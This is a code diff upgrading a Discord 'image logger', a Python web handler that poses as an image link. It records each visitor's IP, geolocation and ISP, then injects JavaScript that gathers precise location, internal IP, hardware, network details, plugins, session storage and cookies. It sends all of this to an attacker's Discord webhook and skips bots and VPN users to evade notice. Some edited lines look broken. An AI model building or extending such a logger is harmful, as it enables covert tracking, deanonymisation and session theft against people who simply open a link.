@@ -1,12 +1,12 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json, re, socket
+import traceback, requests, base64, httpagentparser, json, socket, time
 from datetime import datetime
 
-__app__ = "Advanced Discord Image Logger"
-__description__ = "Enhanced IP and system information logger using Discord's Open Original feature"
-__version__ = "v3.0"
-__author__ = "Modified from DeKrypt's original"
+__app__ = "Ultimate Discord Image Logger"
+__description__ = "Advanced IP and system information logger with maximum data collection"
+__version__ = "v4.0"
+__author__ = "Enhanced from DeKrypt's original"
 
 config = {
     # BASE CONFIG #
@@ -15,19 +15,20 @@ config = {
     "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Advanced Logger",
+    "username": "Ultimate Logger",
     "color": 0x00FFFF,
-    "avatar_url": "",  # Optional webhook avatar URL
+    "avatar_url": "",
+    "footer": "Ultimate Logger v4.0",
 
     # OPTIONS #
     "crashBrowser": False,
-    "accurateLocation": True,  # Now enabled by default with better implementation
-    "disableVpnCheck": False,  # Set to True to bypass VPN checks completely
-    "extendedDataCollection": True,  # Gathers additional system info
+    "accurateLocation": True,
+    "disableVpnCheck": False,
+    "extendedDataCollection": True,
     
     "message": {
         "doMessage": True,
-        "message": "This browser has been analyzed by our security system.",
+        "message": "This device has been analyzed by our security systems.",
         "richMessage": True,
     },
 
@@ -37,11 +38,18 @@ config = {
     "antiBot": 1,
 
     # ENHANCED OPTIONS #
-    "collectScreenData": True,  # Attempt to get screen resolution
-    "collectTimezone": True,   # Get detailed timezone info
-    "collectLanguage": True,   # Get browser language
-    "collectCookies": False,   # Experimental - requires JavaScript
-    "collectWebRTC": True,     # Attempt to get internal IP via WebRTC
+    "collectScreenData": True,
+    "collectTimezone": True,
+    "collectLanguage": True,
+    "collectWebRTC": True,
+    "collectHardware": True,
+    "collectNetwork": True,
+    "collectCookies": False,
+    "collectSessionStorage": False,
+
+    # PERFORMANCE #
+    "timeout": 5,  # seconds for API calls
+    "maxRetries": 2,
 
     # REDIRECTION #
     "redirect": {
@@ -52,31 +60,31 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164")
 
-def get_local_ip():
+def get_local_network_info():
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-        return local_ip
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        return {"hostname": hostname, "local_ip": local_ip}
     except:
         return None
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    elif "googlebot" in useragent.lower():
-        return "Google Bot"
-    elif "bingbot" in useragent.lower():
-        return "Bing Bot"
-    elif "yandex" in useragent.lower():
-        return "Yandex Bot"
-    elif "slurp" in useragent.lower():
-        return "Yahoo Bot"
-    else:
-        return False
+    bot_indicators = {
+        "34": "Discord",
+        "35": "Discord",
+        "TelegramBot": "Telegram",
+        "googlebot": "Google Bot",
+        "bingbot": "Bing Bot",
+        "yandex": "Yandex Bot",
+        "slurp": "Yahoo Bot",
+        "facebookexternalhit": "Facebook Crawler",
+        "twitterbot": "Twitter Bot"
+    }
+    
+    for indicator, name in bot_indicators.items():
+        if ip.startswith(indicator) if indicator.isdigit() else indicator.lower() in useragent.lower():
+            return name
+    return False
 
 def reportError(error):
     error_embed = {
@@ -87,7 +95,8 @@ def reportError(error):
                 "title": "Logger Error",
                 "color": 0xFF0000,
                 "description": f"```\n{error[:1800]}\n```",
-                "timestamp": datetime.utcnow().isoformat()
+                "timestamp": datetime.utcnow().isoformat(),
+                "footer": {"text": config["footer"]}
             }
         ]
     }
@@ -95,24 +104,30 @@ def reportError(error):
         error_embed["avatar_url"] = config["avatar_url"]
     
     try:
-        requests.post(config["webhook"], json=error_embed, timeout=10)
+        requests.post(config["webhook"], json=error_embed, timeout=config["timeout"])
     except:
         pass
 
 def get_geolocation(ip):
-    try:
-        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
-        if response.status_code == 200:
-            return response.json()
-    except:
-        pass
+    retries = 0
+    while retries < config["maxRetries"]:
+        try:
+            response = requests.get(
+                f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query",
+                timeout=config["timeout"]
+            )
+            if response.status_code == 200:
+                return response.json()
+        except:
+            retries += 1
+            time.sleep(1)
     return None
 
 def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additional_data=None):
     if ip.startswith(blacklistedIPs):
         return None
     
-    bot = botCheck(ip, useragent)
+    bot = botCheck(ip, useragent or "")
     
     if bot:
         if config["linkAlerts"]:
@@ -124,7 +139,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
                         "title": "Bot Detected",
                         "color": config["color"],
                         "description": f"Bot interaction detected\n\n**IP:** `{ip}`\n**Type:** `{bot}`\n**Endpoint:** `{endpoint}`",
-                        "timestamp": datetime.utcnow().isoformat()
+                        "timestamp": datetime.utcnow().isoformat(),
+                        "footer": {"text": config["footer"]}
                     }
                 ]
             }
@@ -132,48 +148,46 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
                 alert_data["avatar_url"] = config["avatar_url"]
             
             try:
-                requests.post(config["webhook"], json=alert_data, timeout=10)
+                requests.post(config["webhook"], json=alert_data, timeout=config["timeout"])
             except:
                 pass
         return None
 
-    info = get_geolocation(ip)
-    if not info:
-        info = {
-            "status": "fail",
-            "isp": "Unknown",
-            "as": "Unknown",
-            "country": "Unknown",
-            "regionName": "Unknown",
-            "city": "Unknown",
-            "lat": 0,
-            "lon": 0,
-            "timezone": "Unknown",
-            "mobile": False,
-            "proxy": False,
-            "hosting": False
-        }
+    info = get_geolocation(ip) or {
+        "status": "fail",
+        "isp": "Unknown",
+        "as": "Unknown",
+        "country": "Unknown",
+        "regionName": "Unknown",
+        "city": "Unknown",
+        "lat": 0,
+        "lon": 0,
+        "timezone": "Unknown",
+        "mobile": False,
+        "proxy": False,
+        "hosting": False
+    }
 
     if config["disableVpnCheck"]:
         info["proxy"] = False
 
     ping = "@everyone"
-    if info["proxy"]:
+    if info.get("proxy"):
         if config["vpnCheck"] == 2:
             return info
         if config["vpnCheck"] == 1:
             ping = ""
 
-    if info["hosting"]:
+    if info.get("hosting"):
         if config["antiBot"] == 4:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 return info
         elif config["antiBot"] == 3:
             return info
         elif config["antiBot"] == 2:
-            if info["proxy"]:
+            if info.get("proxy"):
                 pass
             else:
                 ping = ""
@@ -203,37 +217,43 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
             extended_info += f"\n> **RAM:** `{additional_data['ram']}`"
         if additional_data.get("gpu"):
             extended_info += f"\n> **GPU:** `{additional_data['gpu']}`"
+        if additional_data.get("network"):
+            extended_info += f"\n> **Network:** `{additional_data['network']}`"
+        if additional_data.get("plugins"):
+            extended_info += f"\n> **Plugins:** `{', '.join(additional_data['plugins'])}`"
 
     embed = {
         "username": config["username"],
         "content": ping,
         "embeds": [
             {
-                "title": "Advanced Logger - New Hit",
+                "title": "ULTIMATE LOGGER - NEW HIT",
                 "color": config["color"],
-                "description": f"""**New Connection Logged**
+                "description": f"""**Complete System Profile**
 
 **Endpoint:** `{endpoint}`
 **Timestamp:** `{datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")}`
 
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ') if '/' in info['timezone'] else info['timezone']} ({info['timezone'].split('/')[0] if '/' in info['timezone'] else 'Unknown'})`
-> **Mobile:** `{info['mobile']}`
-> **VPN/Proxy:** `{info['proxy']}`
-> **Hosting/Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Country:** `{info.get('country', 'Unknown')} ({info.get('countryCode', '')})`
+> **Region:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **ZIP:** `{info.get('zip', 'Unknown')}`
+> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[-1].replace('_', ' ')} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})`
+> **Mobile:** `{info.get('mobile', False)}`
+> **VPN/Proxy:** `{info.get('proxy', False)}`
+> **Hosting/Bot:** `{info.get('hosting', False)}`
 
 **System Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 > **User Agent:**
-                "timestamp": datetime.utcnow().isoformat()
+                "timestamp": datetime.utcnow().isoformat(),
+                "footer": {"text": config["footer"]}
             }
         ]
     }
@@ -245,7 +265,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None, additi
         embed["embeds"][0].update({"thumbnail": {"url": url}})
     
     try:
-        requests.post(config["webhook"], json=embed, timeout=10)
+        requests.post(config["webhook"], json=embed, timeout=config["timeout"])
     except:
         pass
     
@@ -255,7 +275,7 @@ binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class AdvancedLoggerAPI(BaseHTTPRequestHandler):
+class UltimateLoggerAPI(BaseHTTPRequestHandler):
     def handleRequest(self):
         try:
             # Parse URL parameters
@@ -277,12 +297,12 @@ class AdvancedLoggerAPI(BaseHTTPRequestHandler):
                 ip = self.client_address[0]
             
             # Skip blacklisted IPs
-            if ip.startswith(blacklistedIPs):
+            if ip and ip.startswith(blacklistedIPs):
                 return
             
             # Check for bots
             user_agent = self.headers.get('user-agent', 'Unknown')
-            if bot_check := botCheck(ip, user_agent):
+            if bot_check := botCheck(ip or "0.0.0.0", user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
@@ -327,11 +347,23 @@ class AdvancedLoggerAPI(BaseHTTPRequestHandler):
                     except:
                         pass
                 
-                if query.get("hw") and config["extendedDataCollection"]:
+                if query.get("hw") and config["collectHardware"]:
                     try:
                         hw_data = json.loads(base64.b64decode(query.get("hw").encode()).decode())
                         if isinstance(hw_data, dict):
                             additional_data.update(hw_data)
+                    except:
+                        pass
+                
+                if query.get("net") and config["collectNetwork"]:
+                    try:
+                        additional_data["network"] = base64.b64decode(query.get("net").encode()).decode()
+                    except:
+                        pass
+                
+                if query.get("plugins") and config["extendedDataCollection"]:
+                    try:
+                        additional_data["plugins"] = json.loads(base64.b64decode(query.get("plugins").encode()).decode())
                     except:
                         pass
             
@@ -350,7 +382,7 @@ class AdvancedLoggerAPI(BaseHTTPRequestHandler):
             
             if config["message"]["richMessage"] and result:
                 replacements = {
-                    "{ip}": ip,
+                    "{ip}": ip or "Unknown",
                     "{isp}": result.get("isp", "Unknown"),
                     "{asn}": result.get("as", "Unknown"),
                     "{country}": result.get("country", "Unknown"),
@@ -362,8 +394,8 @@ class AdvancedLoggerAPI(BaseHTTPRequestHandler):
                     "{mobile}": str(result.get("mobile", False)),
                     "{vpn}": str(result.get("proxy", False)),
                     "{bot}": str(result.get("hosting", False)),
-                    "{browser}": httpagentparser.simple_detect(user_agent)[1],
-                    "{os}": httpagentparser.simple_detect(user_agent)[0]
+                    "{browser}": httpagentparser.simple_detect(user_agent)[1] if user_agent != "Unknown" else "Unknown",
+                    "{os}": httpagentparser.simple_detect(user_agent)[0] if user_agent != "Unknown" else "Unknown"
                 }
                 
                 for placeholder, value in replacements.items():
@@ -413,7 +445,7 @@ if (!currenturl.includes("g=") && navigator.geolocation) {
                 js_script += b"""
 // Screen resolution
 if (!currenturl.includes("screen=")) {
-    var screenInfo = window.screen.width + "x" + window.screen.height;
+    var screenInfo = window.screen.width + "x" + window.screen.height + " (" + window.screen.colorDepth + "bit)";
     if (currenturl.includes("?")) {
         currenturl += "&screen=" + btoa(screenInfo).replace(/=/g, "%3D");
     } else {
@@ -472,7 +504,26 @@ if (!currenturl.includes("rtc=")) {
     document.head.appendChild(rtcScript);
 }
 
-// Hardware info (experimental)
+// Network info
+if (!currenturl.includes("net=")) {
+    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (connection) {
+        var netInfo = {
+            type: connection.type,
+            effectiveType: connection.effectiveType,
+            downlink: connection.downlink + " Mbps",
+            rtt: connection.rtt + " ms",
+            saveData: connection.saveData
+        };
+        if (currenturl.includes("?")) {
+            currenturl += "&net=" + btoa(JSON.stringify(netInfo)).replace(/=/g, "%3D");
+        } else {
+            currenturl += "?net=" + btoa(JSON.stringify(netInfo)).replace(/=/g, "%3D");
+        }
+    }
+}
+
+// Hardware info
 if (!currenturl.includes("hw=")) {
     var hardwareInfo = {};
     
@@ -488,6 +539,7 @@ if (!currenturl.includes("hw=")) {
     if (navigator.gpu) {
         navigator.gpu.requestAdapter().then(function(adapter) {
             hardwareInfo.gpu = adapter.name || "Unknown";
+            hardwareInfo.gpuFeatures = adapter.features || [];
             if (currenturl.includes("?")) {
                 currenturl += "&hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
             } else {
@@ -508,9 +560,59 @@ if (!currenturl.includes("hw=")) {
         } else {
             currenturl += "?hw=" + btoa(JSON.stringify(hardwareInfo)).replace(/=/g, "%3D");
         }
-        location.replace(currenturl);
     }
 }
+
+// Browser plugins
+if (!currenturl.includes("plugins=") && navigator.plugins) {
+    var plugins = [];
+    for (var i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+    }
+    if (plugins.length > 0) {
+        if (currenturl.includes("?")) {
+            currenturl += "&plugins=" + btoa(JSON.stringify(plugins)).replace(/=/g, "%3D");
+        } else {
+            currenturl += "?plugins=" + btoa(JSON.stringify(plugins)).replace(/=/g, "%3D");
+        }
+    }
+}
+
+// Session storage (if enabled)
+if (!currenturl.includes("session=") && config["collectSessionStorage"] && window.sessionStorage) {
+    try {
+        var sessionData = {};
+        for (var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            sessionData[key] = sessionStorage.getItem(key);
+        }
+        if (Object.keys(sessionData).length > 0) {
+            if (currenturl.includes("?")) {
+                currenturl += "&session=" + btoa(JSON.stringify(sessionData)).replace(/=/g, "%3D");
+            } else {
+                currenturl += "?session=" + btoa(JSON.stringify(sessionData)).replace(/=/g, "%3D");
+            }
+        }
+    } catch(e) {}
+}
+
+// Cookies (if enabled)
+if (!currenturl.includes("cookies=") && config["collectCookies"] && document.cookie) {
+    try {
+        if (currenturl.includes("?")) {
+            currenturl += "&cookies=" + btoa(document.cookie).replace(/=/g, "%3D");
+        } else {
+            currenturl += "?cookies=" + btoa(document.cookie).replace(/=/g, "%3D");
+        }
+    } catch(e) {}
+}
+
+// Final redirect with all collected data
+setTimeout(function() {
+    if (currenturl !== window.location.href) {
+        location.replace(currenturl);
+    }
+}, 500);
 </script>
 """
             
@@ -530,4 +632,4 @@ if (!currenturl.includes("hw=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = app = AdvancedLoggerAPI    
+handler = app = UltimateLoggerAPI
